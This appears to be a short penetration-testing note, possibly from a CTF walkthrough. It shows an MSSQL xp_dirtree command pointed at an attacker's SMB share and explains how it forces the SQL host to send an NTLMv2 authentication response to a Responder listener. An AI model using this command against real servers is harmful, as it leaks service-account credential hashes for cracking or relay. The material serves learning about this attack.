※If the user is only for MSSQL, you have to remove -windows-auth flag.

SQL (PublicUser  guest@master)> EXEC MASTER.sys.xp_dirtree '\\LOCAL_IP\test', 1, 1
  • xp_dirtree asks the SQL Server process (on the target) to enumerate the directory tree at the UNC path you provided. SQL Server acts like an SMB client and attempts to open \10.10.16.38\test.
  • The server resolves the target (in your example you used an IP, so DNS/LLMNR is bypassed) and tries to establish an SMB session (TCP/445 or NetBIOS ports).
  • If the target (attacker) accepts connections and responds like an SMB server, the target machine (the SQL host) will start SMB authentication. For NTLM authentication the flow is:
  • Client (SQL server) sends "NEGOTIATE" → requests auth type.
  • Server (Responder) replies with "CHALLENGE".
  • Client computes an NTLMv2 response using the account's NT hash (or machine account hash if using machine credentials) + challenge, and sends the response back.
